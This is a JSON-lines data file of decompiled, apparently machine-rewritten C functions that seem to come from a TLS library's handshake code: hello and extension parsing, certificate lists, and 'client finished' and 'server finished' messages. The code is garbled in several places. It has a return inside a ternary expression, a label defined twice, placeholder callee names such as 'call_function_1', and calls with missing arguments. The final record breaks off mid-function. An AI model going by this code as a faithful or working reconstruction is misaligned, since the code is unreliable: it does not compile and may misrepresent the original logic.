{"Function Name": "FUN_0042fc60", "Address": "0042fc60", "Source Code": "undefined8 FUN_0042fc60(long *linkedList, char *comparisonString, int maxChars)\n{\n    char *currentCharPtr; \n    long index;   \n    long matchLength;   \n    int charsToCompare;    \n    \n    if (linkedList != (long *)0x0) {\n        do {\n            currentCharPtr = (char *)linkedList[1]; \n            \n            if (currentCharPtr != (char *)0x0) {\n                \n                charsToCompare = (maxChars < 0x10) ? (maxChars < 1 ? return 1 : maxChars) : 0x10;\n                \n                if (*currentCharPtr == *comparisonString) {\n                    matchLength = 0; \n                    do {\n                        \n                        if (charsToCompare <= (int)matchLength + 1) {\n                            return 1;\n                        }\n                        index = matchLength + 1; \n                        matchLength = matchLength + 1; \n                    } while (currentCharPtr[index] == comparisonString[matchLength]); \n                }\n            }\n            linkedList = (long *)*linkedList; \n        } while (linkedList != (long *)0x0); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00430e20", "Address": "00430e20", "Source Code": "ulong processData(long inputParam, byte *dataBuffer, int dataLength, int flag)\n{\n    uint tempUInt; \n    long tempLong; \n    bool isConditionMet = false; \n    int remainingBytes; \n    uint currentValue; \n    long resultLong; \n    void *allocatedMemory; \n    ulong tempULong; \n    int nextIndex; \n    uint remainingValue; \n    uint currentIndex; \n    uint initialValue = ((uint)*dataBuffer * 0x100 + (uint)dataBuffer[1]) * 0x100 + (uint)dataBuffer[2]; \n    if (initialValue < 5) { \n        return (ulong)(initialValue + 3); \n    }\n    if (*(char *)(inputParam + 0x223c9) == '\\0') { \n        currentIndex = 3; \n        remainingBytes = dataLength - 3; \n    } else {\n        if ((10 < dataLength) && (tempULong = FUN_00405c50(dataBuffer), (int)tempULong < 0)) { \n            return tempULong; \n        }\n        currentIndex = 0xb; \n        remainingBytes = dataLength - 0xb; \n    }\n    if ((remainingBytes < (int)initialValue) || (remainingBytes < 0)) { \n        return 0; \n    }\n    do {\n        if ((int)(dataLength - currentIndex) < 3) { \n            return 0; \n        }\n        currentValue = ((uint)dataBuffer[(int)currentIndex] * 0x100 + (uint)dataBuffer[(long)(int)currentIndex + 1]) * 0x100 + (uint)dataBuffer[(long)(int)currentIndex + 2]; \n        remainingBytes = currentIndex + 3; \n        if (dataLength - remainingBytes < (int)currentValue) { \n            return 0; \n        }\n        if (3 < currentValue) { \n            remainingValue = currentValue - 3; \n            nextIndex = currentIndex + 6; \n            currentIndex = ((uint)dataBuffer[(long)remainingBytes + 1] + (uint)dataBuffer[remainingBytes] * 0x100) * 0x100 + (uint)dataBuffer[(long)remainingBytes + 2]; \n            if (currentIndex <= remainingValue) { \n                do {\n                    resultLong = FUN_00430d50(inputParam, dataBuffer + nextIndex, currentIndex, flag); \n                    if (resultLong != 0) { \n                        if (currentIndex != 0) { \n                            allocatedMemory = malloc((ulong)currentIndex); \n                            *(void **)(resultLong + 0xf0) = allocatedMemory; \n                            if (allocatedMemory != (void *)0x0) { \n                                *(uint *)(resultLong + 0xf8) = currentIndex; \n                                memcpy(allocatedMemory, dataBuffer + nextIndex, (ulong)currentIndex); \n                            }\n                        }\n                        if (flag == 0) { \n                            allocatedMemory = realloc(*(void **)(inputParam + 0x68), (ulong)(*(int *)(inputParam + 0xb0) + 1) << 3); \n                            tempUInt = *(uint *)(inputParam + 0xb0); \n                            *(void **)(inputParam + 0x68) = allocatedMemory; \n                            *(long *)((long)allocatedMemory + (ulong)tempUInt * 8) = resultLong; \n                            tempLong = *(long *)(resultLong + 0x20); \n                            *(uint *)(inputParam + 0xb0) = tempUInt + 1; \n                            if ((tempLong == 0) && (*(long *)(resultLong + 0x30) == 0)) { \n                                isConditionMet = true; \n                            }\n                        } else {\n                            allocatedMemory = realloc(*(void **)(inputParam + 0xa8), (ulong)(*(int *)(inputParam + 0xb4) + 1) << 3); \n                            tempUInt = *(uint *)(inputParam + 0xb4); \n                            *(void **)(inputParam + 0xa8) = allocatedMemory; \n                            *(long *)((long)allocatedMemory + (ulong)tempUInt * 8) = resultLong; \n                            *(uint *)(inputParam + 0xb4) = tempUInt + 1; \n                        }\n                    }\n                    if (remainingValue - currentIndex < 4) break; \n                    nextIndex += currentIndex + 3; \n                    remainingValue -= currentIndex + 3; \n                    currentIndex = ((uint)dataBuffer[(long)nextIndex + 1] + (uint)dataBuffer[nextIndex] * 0x100) * 0x100 + (uint)dataBuffer[(long)nextIndex + 2]; \n                } while (currentIndex <= remainingValue); \n            }\n        }\n        initialValue = (initialValue - 3) - currentValue; \n        currentIndex = remainingBytes + currentValue; \n    } while (0 < (int)initialValue); \n    return isConditionMet ? (ulong)currentIndex : 0xfffffff1; \n}"}
{"Function Name": "FUN_00431120", "Address": "00431120", "Source Code": "undefined8 FUN_00431120(undefined8 input1, undefined8 input2, int threshold)\n{\n    \n    if (2 < threshold) {\n        \n        return FUN_00430e20();\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00431140", "Address": "00431140", "Source Code": "undefined4 FUN_00431140(long param_1, undefined8 param_2, undefined4 param_3)\n{\n    uint unsignedIntVar; \n    void *dynamicMemoryPtr; \n    ushort *ushortPtr; \n    int counter = 0; \n    int localArray[3]; \n    if (param_1 == 0) { \n        return 0xffffffff; \n    }\n    do {\n        \n        dynamicMemoryPtr = (void *)FUN_00426dd0(param_2, param_3, counter, localArray);\n        if (dynamicMemoryPtr == (void *)0x0 || localArray[0] == 0) { \n            return *(undefined4 *)(param_1 + 0xb0); \n        }\n        \n        \n        ushortPtr = (ushort *)FUN_00430d50(param_1, dynamicMemoryPtr, localArray[0], 0);\n        if (ushortPtr != (ushort *)0x0) { \n            if ((*ushortPtr & 0xfffd) != 0) { \n                FUN_00427e80(ushortPtr); \n                free(dynamicMemoryPtr); \n                continue; \n            }\n            if (*(void **)(ushortPtr + 0x70) != (void *)0x0) { \n                free(*(void **)(ushortPtr + 0x70)); \n            }\n            *(void **)(ushortPtr + 0x70) = dynamicMemoryPtr; \n            *(int *)(ushortPtr + 0x74) = localArray[0]; \n            if (*(void **)(ushortPtr + 0x18) != (void *)0x0) { \n                free(*(void **)(ushortPtr + 0x18)); \n                *(undefined8 *)(ushortPtr + 0x18) = 0; \n                *(undefined4 *)(ushortPtr + 0x1c) = 0; \n            }\n            if (*(char *)(param_1 + 0x66) == '\\0') { \n                \n                dynamicMemoryPtr = realloc(*(void **)(param_1 + 0xa8), (ulong)(*(int *)(param_1 + 0xb4) + 1) << 3);\n                unsignedIntVar = *(uint *)(param_1 + 0xb4); \n                *(void **)(param_1 + 0xa8) = dynamicMemoryPtr; \n                *(ushort **)((long)dynamicMemoryPtr + (ulong)unsignedIntVar * 8) = ushortPtr; \n                *(uint *)(param_1 + 0xb4) = unsignedIntVar + 1; \n            } else {\n                \n                dynamicMemoryPtr = realloc(*(void **)(param_1 + 0x68), (ulong)(*(int *)(param_1 + 0xb0) + 1) << 3);\n                unsignedIntVar = *(uint *)(param_1 + 0xb0); \n                *(void **)(param_1 + 0x68) = dynamicMemoryPtr; \n                *(ushort **)((long)dynamicMemoryPtr + (ulong)unsignedIntVar * 8) = ushortPtr; \n                *(uint *)(param_1 + 0xb0) = unsignedIntVar + 1; \n            }\n            counter++; \n        }\n    } while (true); \n}"}
{"Function Name": "FUN_004312b0", "Address": "004312b0", "Source Code": "undefined8 FUN_004312b0(long param_1, undefined8 param_2, undefined4 param_3)\n{\n    void *result_ptr; \n    long result_value; \n    undefined8 return_value = 0; \n    int iteration_counter = 0; \n    int local_data[3]; \n    if (param_1 == 0) { \n        return 0xffffffff; \n    }\n    while (true) { \n        result_ptr = (void *)FUN_00426dd0(param_2, param_3, iteration_counter, local_data); \n        if ((result_ptr == (void *)0x0) || (local_data[0] == 0)) break; \n        result_value = FUN_00430d50(param_1, result_ptr, local_data[0], 0xffffffff); \n        if (result_value == 0) { \n            free(result_ptr); \n            iteration_counter++; \n        } else {\n            if (*(int *)(result_value + 0xe8) == 0) { \n                if (*(void **)(result_value + 0xe0) != (void *)0x0) { \n                    free(*(void **)(result_value + 0xe0)); \n                }\n                *(void **)(result_value + 0xe0) = result_ptr; \n                *(int *)(result_value + 0xe8) = local_data[0]; \n            } else {\n                free(result_ptr); \n            }\n            if ((*(long *)(result_value + 0x30) != 0) && (*(int *)(result_value + 0x38) != 0)) { \n                if (*(int *)(result_value + 0xc) == 0) { \n                    if (*(long *)(param_1 + 0x70) != 0) { \n                        FUN_00427e80(); \n                    }\n                    *(long *)(param_1 + 0x70) = result_value; \n                    return 1; \n                }\n                if (*(long *)(param_1 + 0x78) != 0) { \n                    FUN_00427e80(); \n                }\n                *(long *)(param_1 + 0x78) = result_value; \n                return 1; \n            }\n            FUN_00427e80(result_value); \n            iteration_counter++; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00431400", "Address": "00431400", "Source Code": "undefined8 FUN_00431400(long inputParam)\n{\n    undefined8 returnValue; \n    uint loopCounter;      \n    ulong loopIndex;     \n    \n    if (((inputParam == 0) || (*(char *)(inputParam + 0x66) == '\\0')) ||\n        (*(char *)(inputParam + 0x223ac) != '\\0')) {\n        returnValue = 0xffffffff; \n    }\n    else {\n        long pointerValue = *(long *)(inputParam + 0x22400); \n        \n        if ((pointerValue != 0) && (*(int *)(inputParam + 0x22408) != 0)) {\n            loopIndex = 0; \n            while (true) {\n                loopCounter = (int)loopIndex + 1; \n                FUN_00427e80(*(undefined8 *)(pointerValue + loopIndex * 8)); \n                \n                if (*(uint *)(inputParam + 0x22408) <= loopCounter) break;\n                loopIndex = (ulong)loopCounter; \n            }\n        }\n        \n        *(undefined8 *)(inputParam + 0x22400) = 0;\n        *(undefined4 *)(inputParam + 0x22408) = 0;\n        \n        if (*(long *)(inputParam + 0x70) != 0) {\n            FUN_00427e80(); \n            *(undefined8 *)(inputParam + 0x70) = 0; \n        }\n        \n        if (*(long *)(inputParam + 0x78) != 0) {\n            FUN_00427e80(); \n            *(undefined8 *)(inputParam + 0x78) = 0; \n        }\n        \n        if (*(void **)(inputParam + 0x68) != (void *)0x0) {\n            free(*(void **)(inputParam + 0x68)); \n            *(undefined8 *)(inputParam + 0x68) = 0; \n        }\n        *(undefined4 *)(inputParam + 0xb0) = 0; \n        returnValue = 0; \n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_004314e0", "Address": "004314e0", "Source Code": "long FUN_004314e0(long inputParam)\n{\n    long *arrayPointer; \n    long currentElement;   \n    long result;   \n    int elementCount;   \n    ushort ushortValue; \n    \n    if (*(char *)(inputParam + 0x66) == '\\0') {\n        ushortValue = *(ushort *)(inputParam + 0x62); \n        elementCount = *(int *)(inputParam + 0xb4);   \n        arrayPointer = *(long **)(inputParam + 0xa8); \n        \n        if (0xc024 < ushortValue) goto LAB_0043168e;\nLAB_00431516:\n        \n        if ((ushortValue < 0xc023) && (1 < (ushort)(ushortValue + 0x3ff7))) goto LAB_0043152e;\n        \n        if (elementCount < 1) goto LAB_004316f0;\n        int counter = 0; \n        \n        for (long result = 0; result < elementCount; result++) {\n            currentElement = arrayPointer[result]; \n            \n            if (currentElement != 0 && *(int *)(currentElement + 0xe8) != 0) {\n                \n                counter += (*(int *)(currentElement + 0xc) == 0) ? (3 + *(int *)(currentElement + 0xe8)) : 0;\n            }\n        }\n        bool isConditionMet = true; \nLAB_0043156b:\n        \n        result = FUN_00428040(inputParam, 0x16, *(undefined2 *)(inputParam + 100), 0);\n        undefined localArray[9] = {0xb}; \n        FUN_00428240(result, localArray, 1); \n        \n        if (counter != 0) {\n            FUN_00428380(result, counter + 3); \n            \n            if (*(char *)(inputParam + 0x223c9) != '\\0') {\n                FUN_0042c5e0(inputParam, result, counter + 3); \n            }\n            FUN_00428380(result, counter); \n            \n            if (elementCount > 0) {\n                long *arrayEnd = arrayPointer + elementCount; \n                for (arrayPointer = arrayPointer; arrayPointer != arrayEnd; arrayPointer++) { \n                    currentElement = *arrayPointer; \n                    \n                    if (currentElement != 0 && *(int *)(currentElement + 0xe8) != 0) {\n                        \n                        if (isConditionMet && *(int *)(currentElement + 0xc) == 0) break; \n                        if (!isConditionMet && *(int *)(currentElement + 0xc) != 0) continue; \n                        FUN_00428380(result); \n                        FUN_00428240(result, *(undefined8 *)(currentElement + 0xe0), *(undefined4 *)(currentElement + 0xe8)); \n                    }\n                }\n            }\n            goto LAB_00431638; \n        }\n    } else {\n        ushortValue = *(ushort *)(inputParam + 0x62); \n        elementCount = *(int *)(inputParam + 0xb0);   \n        arrayPointer = *(long **)(inputParam + 0x68); \n        \n        if (ushortValue < 0xc025) goto LAB_00431516;\nLAB_0043168e:\n        \n        if ((0xc02a < ushortValue) && ((ushortValue < 0xc02d || (ushortValue == 0xcca9)))) goto LAB_004316a8;\nLAB_0043152e:\n        \n        if (elementCount > 0) {\n            int counter = 0; \n            \n            for (long result = 0; result < elementCount; result++) {\n                currentElement = arrayPointer[result]; \n                \n                if (currentElement != 0 && *(int *)(currentElement + 0xe8) != 0) {\n                    \n                    if (*(int *)(currentElement + 0xc) == 0) {\n                        counter += (3 + *(int *)(currentElement + 0xe8));\n                    }\n                }\n            }\n            isConditionMet = false; \n            goto LAB_0043156b; \n        }\nLAB_004316f0:\n        \n        result = FUN_00428040(inputParam, 0x16, *(undefined2 *)(inputParam + 100), 0);\n        undefined localArray[9] = {0xb}; \n        FUN_00428240(result, localArray, 1); \n    }\n    FUN_00428380(result, 0); \n    \n    if (*(char *)(inputParam + 0x223c9) != '\\0') {\n        FUN_0042c5e0(inputParam, result, 0); \n    }\nLAB_00431638:\n    \n    if ((result != 0) && (*(char *)(result + 0x10) == '\\0')) {\n        FUN_0042d8f0(result); \n    }\n    \n    if (*(char *)(inputParam + 0x223c9) != '\\0') {\n        *(char *)(inputParam + 0x223d9) += 1; \n    }\n    return result; \n}"}
{"Function Name": "FUN_00431770", "Address": "00431770", "Source Code": "long FUN_00431770(long input_param)\n{\n    undefined4 result_var; \n    long function_result; \n    \n    function_result = FUN_00428040(input_param, 0x16, *(undefined2 *)(input_param + 100), 0x4c);\n    \n    \n    FUN_00428240(function_result, (undefined *)0x14, 1);\n    \n    \n    FUN_00428380(function_result, 0xc);\n    \n    \n    if (*(char *)(input_param + 0x223c9) != '\\0') {\n        \n        FUN_0042c5e0(input_param, function_result, 0xc);\n    }\n    \n    \n    if (*(char *)(input_param + 0x66) == '\\0') {\n        \n        result_var = FUN_0042a710(input_param, (undefined [48]){0});\n        \n        \n        if ((*(int *)(input_param + 0xc0) != 0) && (*(long *)(input_param + 0xb8) != 0)) {\n            \n            FUN_00426a30(input_param, (undefined [16]){0}, 0xc, *(long *)(input_param + 0xb8), *(int *)(input_param + 0xc0),\n                          \"client finished\", 0xf, (undefined [48]){0}, result_var, 0, 0);\n        }\n    } else {\n        \n        result_var = FUN_0042a530();\n        \n        \n        if ((*(int *)(input_param + 0xc0) == 0) || (*(long *)(input_param + 0xb8) == 0)) {\n            \n            void *pointer_to_free = *(void **)(input_param + 0x22360);\n            if (pointer_to_free != (void *)0x0) {\n                free(pointer_to_free);\n            }\n            \n            *(undefined8 *)(input_param + 0x22360) = 0;\n        } else {\n            \n            FUN_00426a30(input_param, (undefined [16]){0}, 0xc, *(long *)(input_param + 0xb8), *(int *)(input_param + 0xc0),\n                          \"server finished\", 0xf, (undefined [48]){0}, result_var, 0, 0);\n                          \n            \n            void *pointer_to_free = *(void **)(input_param + 0x22360);\n            if (pointer_to_free != (void *)0x0) {\n                free(pointer_to_free);\n            }\n            \n            *(undefined8 *)(input_param + 0x22360) = 0;\n        }\n    }\n    \n    \n    FUN_00428240(function_result, (undefined [16]){0}, 0xc);\n    \n    \n    if ((function_result != 0) && (*(char *)(function_result + 0x10) == '\\0')) {\n        \n        FUN_0042d8f0(function_result);\n    }\n    \n    \n    return function_result;\n}"}
{"Function Name": "FUN_00431920", "Address": "00431920", "Source Code": "long FUN_00431920(long input_param) \n{\n    long result_value; \n    result_value = helper_function(input_param, 0x14, *(undefined2 *)(input_param + 100), 0x40); \n    if ((result_value != 0) && (*(char *)(result_value + 0x10) == '\\0')) { \n        cleanup_function(result_value); \n    }\n    *(undefined8 *)(input_param + 0x22380) = 0; \n    return result_value; \n}"}
{"Function Name": "FUN_00431980", "Address": "00431980", "Source Code": "long FUN_00431980(long input_param)\n{\n    long result; \n    \n    result = call_function_1(input_param, 0x16, *(undefined2 *)(input_param + 100), 0);\n    \n    call_function_2(result, (undefined[]){0xe}, 1);\n    \n    call_function_3(result, 0);\n    \n    if (*(char *)(input_param + 0x223c9) != '\\0') {\n        \n        call_function_4(input_param, result, 0);\n        \n        *(char *)(input_param + 0x223d9) += 1;\n    }\n    \n    if ((result != 0) && (*(char *)(result + 0x10) == '\\0')) {\n        \n        call_function_5(result);\n    }\n    \n    return result;\n}"}
{"Function Name": "FUN_00431a00", "Address": "00431a00", "Source Code": "long FUN_00431a00(long input_value, long secondary_value, int flag_value)\n{\n    \n    if ((secondary_value != 0) && (flag_value != 0)) {\n        \n        long result_value = FUN_00428040(input_value, 0x17, *(undefined2 *)(input_value + 100), flag_value);\n        \n        \n        FUN_00428240(result_value, secondary_value, flag_value);\n        \n        \n        if (result_value != 0) {\n            \n            if (*(char *)(result_value + 0x10) != '\\0') {\n                \n                return result_value;\n            }\n            \n            FUN_0042d8f0(result_value);\n            \n            return result_value;\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00431a80", "Address": "00431a80", "Source Code": "undefined8 FUN_00431a80(long input_pointer)\n{\n    \n    if ((*(char *)(input_pointer + 0x66) == '\\0') && (*(char *)(input_pointer + 0x22389) == '\\0')) {\n        \n        return FUN_0042ab40(FUN_0042e8f0(input_pointer, 0));\n    }\n    \n    return 0xfffffffa;\n}"}
{"Function Name": "FUN_00431ac0", "Address": "00431ac0", "Source Code": "uint FUN_00431ac0(long inputValue, undefined8 additionalData, uint thresholdValue)\n{\n    \n    if (inputValue == 0) {\n        return 0xffffffff; \n    }\n    \n    uint defaultValue = 0x4000; \n    \n    if (thresholdValue < 0x4001) {\n        defaultValue = thresholdValue;\n    }\n    \n    \n    if (*(char *)(inputValue + 0x22388) == -1) {\n        \n        undefined8 resultFromFirstFunction = FUN_00431a00(inputValue, additionalData, defaultValue);\n        \n        uint resultFromSecondFunction = FUN_0042ab40(resultFromFirstFunction);\n        \n        if (0 < (int)resultFromSecondFunction) {\n            return defaultValue;\n        }\n    }\n    \n    \n    return 0xfffffffa;\n}"}
{"Function Name": "FUN_00431b00", "Address": "00431b00", "Source Code": "long FUN_00431b00(long input_value, char flag, undefined data)\n{\n    long result; \n    undefined data_array[9]; \n    \n    result = FUN_00428040(input_value, 0x15, *(undefined2 *)(input_value + 100), 0);\n    \n    data_array[0] = data; \n    \n    if (flag == '\\0') {\n        \n        FUN_00428240(result, (undefined[]){1}, 1);\n    } else {\n        \n        FUN_00428240(result, (undefined[]){2}, 1);\n        *(undefined *)(input_value + 0x22389) = 1; \n    }\n    \n    FUN_00428240(result, data_array, 1);\n    \n    if ((result != 0) && (*(char *)(result + 0x10) == '\\0')) {\n        \n        FUN_0042d8f0(result);\n    }\n    return result; \n}"}
{"Function Name": "FUN_00431bb0", "Address": "00431bb0", "Source Code": "ulong FUN_00431bb0(undefined8 *param_1, byte *param_2, uint param_3, undefined4 *param_4, undefined4 *param_5)\n{\n    byte firstByte, secondByte, thirdByte, fourthByte; \n    char characterVar; \n    bool booleanFlag; \n    ushort ushortValue1, ushortValue2; \n    int indexVar1, indexVar2; \n    undefined8 *pointerVar; \n    ulong ulongValue; \n    uint unsignedIntValue; \n    byte *localBytePointer; \n    int localIntArray[3]; \n    *param_4 = 0; \n    *param_5 = 0; \n    firstByte = *(byte *)(param_1 + 0x4471); \n    if ((firstByte & 0xfb) != 0) { \n        return (ulong)((-(uint)(*(char *)((long)param_1 + 0x223c9) == '\\0') & 0xfffffff9) + 1); \n    }\n    characterVar = *(char *)((long)param_1 + 0x223c9); \n    if ((int)param_3 < (int)((-(uint)(characterVar == '\\0') & 0xfffffff8) + 0x31) || (int)param_3 < 0) { \n        return 0; \n    }\n    secondByte = *param_2; \n    thirdByte = param_2[1]; \n    fourthByte = param_2[2]; \n    indexVar1 = (characterVar == '\\0') ? 3 : 0xb; \n    if ((int)(param_3 - indexVar1) < (int)((uint)fourthByte + ((uint)secondByte * 0x100 + (uint)thirdByte) * 0x100)) { \n        return 0; \n    }\n    ushortValue1 = *(ushort *)(param_2 + indexVar1) >> 8 | *(ushort *)(param_2 + indexVar1) << 8; \n    if (((3 < (ushort)(ushortValue1 - 0x301)) && (1 < (ushort)(ushortValue1 + 0x104))) && (ushortValue1 != 0xfeff)) { \n        if (ushortValue1 != 0x300) {\n            return 0xfffffffc; \n        }\n        if (firstByte != 0) {\n            return 0xfffffffc; \n        }\n        ushortValue1 = 0x303; \n    }\n    if (characterVar == '\\0') { \n        if (ushortValue1 < *(ushort *)((long)param_1 + 100)) goto LAB_00431ca0; \n        LAB_00431f9a:\n        booleanFlag = false; \n    } else {\n        if (ushortValue1 <= *(ushort *)((long)param_1 + 100)) goto LAB_00431ca0; \n        LAB_00431f9a:\n        *(ushort *)((long)param_1 + 100) = ushortValue1; \n        booleanFlag = true; \n        if (*(char *)((long)param_1 + 0x66) == '\\0') { \n            FUN_0042a460(param_1); \n            booleanFlag = true; \n        }\n    }\n    indexVar2 = indexVar1 + 0x23; \n    pointerVar = (undefined8 *)(param_2 + (indexVar1 + 2)); \n    *param_1 = *pointerVar; \n    param_1[1] = pointerVar[1]; \n    param_1[2] = pointerVar[2]; \n    param_1[3] = pointerVar[3]; \n    firstByte = param_2[indexVar1 + 0x22]; \n    if ((int)(param_3 - (indexVar2)) < (int)(uint)firstByte) { \n        return 0; \n    }\n    *(undefined *)(param_1 + 0xc) = (firstByte - 1 < 0x20) ? memcpy(param_1 + 8, param_2 + indexVar2, (ulong)firstByte), firstByte : 0; \n    indexVar2 += (uint)firstByte; \n    localIntArray[0] = 0; \n    if (*(char *)((long)param_1 + 0x66) == '\\0') { \n        if ((int)(param_3 - indexVar2) < 2) {\n            return 0; \n        }\n        ushortValue1 = *(ushort *)(param_2 + indexVar2) >> 8 | *(ushort *)(param_2 + indexVar2) << 8; \n        *(ushort *)((long)param_1 + 0x62) = ushortValue1; \n        if (FUN_0042b5c0(param_1, ushortValue1) == 0) { \n            *(undefined2 *)((long)param_1 + 0x62) = 0; \n            return 0xfffffffb; \n        }\n        if ((int)(param_3 - (indexVar2 + 2)) < 1) {\n            return 0; \n        }\n        if (param_2[indexVar2 + 2] != 0) {\n            return 0xfffffff8; \n        }\n        unsignedIntValue = 0; \n        localBytePointer = (byte *)0x0; \n        goto LAB_00431e8a; \n    }\n    if (*(char *)((long)param_1 + 0x223c9) == '\\0') { \n        LAB_00431e0d:\n        if ((int)(param_3 - indexVar2) < 2) {\n            return 0; \n        }\n        indexVar1 = indexVar2 + 2; \n        ushortValue1 = *(ushort *)(param_2 + indexVar2) >> 8; \n        unsignedIntValue = (uint)(ushort)(ushortValue1 | *(ushort *)(param_2 + indexVar2) << 8); \n        if ((int)(param_3 - indexVar1) < (int)unsignedIntValue) {\n            return 0; \n        }\n        if ((ushortValue1 & 1) != 0) {\n            return 0xfffffffe; \n        }\n        indexVar1 += unsignedIntValue; \n        if ((int)(param_3 - indexVar1) < 1) {\n            return 0; \n        }\n        if ((int)(param_3 - (indexVar1 + 1)) < (int)(uint)param_2[indexVar1]) {\n            return 0; \n        }\n        indexVar1 += 1 + (uint)param_2[indexVar1]; \n        localBytePointer = param_2 + indexVar2; \n        if (*(char *)((long)param_1 + 0x66) != '\\0') {\n            *param_4 = 2; \n        }\n        LAB_00431e8a:\n        if (*(char *)(param_1 + 0x4471) != '\\x04') { \n            *(undefined *)(param_1 + 0x4471) = 1; \n        }\n        unsignedIntValue = indexVar1 + 2; \n        do {\n            int iVar8_temp = param_3 - unsignedIntValue; \n            ushort *puVar11 = (ushort *)(param_2 + (int)unsignedIntValue); \n            do {\n                unsignedIntValue += 4; \n                if (iVar8_temp < 4) { \n                    if (unsignedIntValue != param_3) {\n                        return 0; \n                    }\n                    if (*(char *)((long)param_1 + 0x66) == '\\0') {\n                        return (ulong)unsignedIntValue; \n                    }\n                    if ((localBytePointer == (byte *)0x0) || ((short)unsignedIntValue == 0)) {\n                        return (ulong)unsignedIntValue; \n                    }\n                    ulongValue = FUN_0042b8b0(param_1, localBytePointer, unsignedIntValue, localIntArray); \n                    if ((int)ulongValue < 0) {\n                        return ulongValue; \n                    }\n                    if ((booleanFlag) && (localIntArray[0] != 0)) { \n                        undefined8 uVar14 = FUN_00431b00(param_1, 1, 0x56); \n                        FUN_0042ab40(uVar14); \n                        *(undefined *)((long)param_1 + 0x22389) = 1; \n                        return 0xfffffffc; \n                    }\n                    *(short *)((long)param_1 + 0x62) = (short)ulongValue; \n                    return (ulong)unsignedIntValue; \n                }\n                ushort uVar15_temp = *puVar11 >> 8 | *puVar11 << 8; \n                ushortValue2 = puVar11[1] >> 8 | puVar11[1] << 8; \n                puVar11 += 2; \n            } while (ushortValue2 == 0); \n            iVar8_temp = param_3 - unsignedIntValue; \n            if (iVar8_temp < (int)(uint)ushortValue2) {\n                return 0; \n            }\n            if (uVar15_temp == 0) { \n                uVar15_temp = *(ushort *)(param_2 + (long)(int)unsignedIntValue + 3) >> 8 |\n                              *(ushort *)(param_2 + (long)(int)unsignedIntValue + 3) << 8; \n                if (iVar8_temp + -4 <= (int)(uint)uVar15_temp) {\n                    return 0; \n                }\n                if (iVar8_temp < 5) {\n                    return 0; \n                }\n                if (uVar15_temp != 0) { \n                    if ((void *)param_1[0x4478] != (void *)0x0) {\n                        free((void *)param_1[0x4478]); \n                    }\n                    void *pvVar12 = malloc((long)(int)(uVar15_temp + 1)); \n                    param_1[0x4478] = pvVar12; \n                    if (pvVar12 != (void *)0x0) { \n                        memcpy(pvVar12, param_2 + (long)(int)unsignedIntValue + 5, (ulong)uVar15_temp); \n                        *(undefined *)(param_1[0x4478] + (ulong)uVar15_temp) = 0; \n                    }\n                }\n            } else if (uVar15_temp == 10) { \n                if (((2 < iVar8_temp) && (uVar15_temp = *(ushort *)(param_2 + (int)unsignedIntValue) >> 8 |\n                    *(ushort *)(param_2 + (int)unsignedIntValue) << 8, (int)(uVar15_temp + 1) < iVar8_temp)) && (uVar15_temp != 0)) { \n                    long lVar16 = 0; \n                    do {\n                        ushort uVar7 = *(ushort *)(param_2 + lVar16 + (int)(unsignedIntValue + 6)) >> 8 |\n                                       *(ushort *)(param_2 + lVar16 + (int)(unsignedIntValue + 6)) << 8; \n                        if (uVar7 == 0x17) {\n                            param_1[0x14] = &DAT_00649380; \n                            break; \n                        }\n                        if (uVar7 == 0x18) {\n                            param_1[0x14] = &DAT_00649280; \n                            break; \n                        }\n                        lVar16 += 2; \n                    } while ((int)lVar16 < (int)(uint)uVar15_temp); \n                }\n            } else if (((uVar15_temp == 0x10) && (param_1[0x4482] != 0)) && \n                       ((*(char *)(param_1 + 0x4483) != '\\0' && (2 < iVar8_temp)))) { \n                uVar15_temp = *(ushort *)(param_2 + (int)unsignedIntValue) >> 8 | *(ushort *)(param_2 + (int)unsignedIntValue) << 8; \n                if ((uVar15_temp != 0) && ((int)(uint)uVar15_temp < (int)(ushortValue2 - 1))) { \n                    long lVar16 = (long)(int)unsignedIntValue + 2; \n                    int iVar8_temp = 0; \n                    while (true) { \n                        int indexVar2 = iVar8_temp + 1; \n                        byte bVar1_temp = param_2[iVar8_temp + lVar16]; \n                        uint uVar18 = (uint)bVar1_temp; \n                        iVar8_temp = uVar18 + indexVar2; \n                        if ((int)(uint)ushortValue2 <= iVar8_temp) break; \n                        if (bVar1_temp != 0) { \n                            if (FUN_0042b3f0(param_1, param_2 + indexVar2 + lVar16, uVar18) != 0) { \n                                if ((void *)param_1[0x4484] != (void *)0x0) {\n                                    free((void *)param_1[0x4484]); \n                                }\n                                void *pvVar12 = malloc((long)(int)(uVar18 + 1)); \n                                param_1[0x4484] = pvVar12; \n                                if (pvVar12 != (void *)0x0) { \n                                    memcpy(pvVar12, param_2 + indexVar2 + lVar16, (ulong)bVar1_temp); \n                                    *(undefined *)(param_1[0x4484] + (ulong)bVar1_temp) = 0; \n                                }\n                                break; \n                            }\n                        }\n                        if ((*(char *)((long)param_1 + 0x66) == '\\0') || ((int)(uint)uVar15_temp <= iVar8_temp)) break; \n                    }\n                }\n            }\n            unsignedIntValue += ushortValue2; \n        } while (true); \n    }\n    if ((int)(param_3 - indexVar2) < 1) { \n        return 0; \n    }\n    firstByte = param_2[indexVar2]; \n    if (firstByte == 0) { \n        *param_4 = 2; \n        return (ulong)param_3; \n    }\n    indexVar2++; \n    if ((int)(param_3 - indexVar2) < (int)(uint)firstByte) { \n        return 0; \n    }\n    void *pvVar12 = (void *)param_1[0x447a]; \n    if ((*(byte *)(param_1 + 0x447b) == 0) || (pvVar12 == (void *)0x0)) { \n        FUN_0042c680(param_1); \n        pvVar12 = (void *)param_1[0x447a]; \n        if (firstByte != *(byte *)(param_1 + 0x447b)) goto LAB_0043242e; \n        if (pvVar12 == (void *)0x0) {\n            *param_5 = 2; \n            goto LAB_004323af; \n        }\n        LAB_00431d7c:\n        indexVar1 = memcmp(pvVar12, param_2 + indexVar2, (ulong)firstByte); \n        if (indexVar1 == 0) { \n            free(pvVar12); \n            param_1[0x447a] = 0; \n            *(undefined *)(param_1 + 0x447b) = 0; \n            *(char *)((long)param_1 + 0x223d9) += 1; \n            indexVar2 += (uint)firstByte; \n            *param_5 = 1; \n            goto LAB_00431e0d; \n        }\n        *param_5 = 3; \n    } else {\n        if (firstByte == *(byte *)(param_1 + 0x447b)) goto LAB_00431d7c; \n        LAB_0043242e:\n        *param_5 = 2; \n        if (pvVar12 == (void *)0x0) goto LAB_004323af; \n    }\n    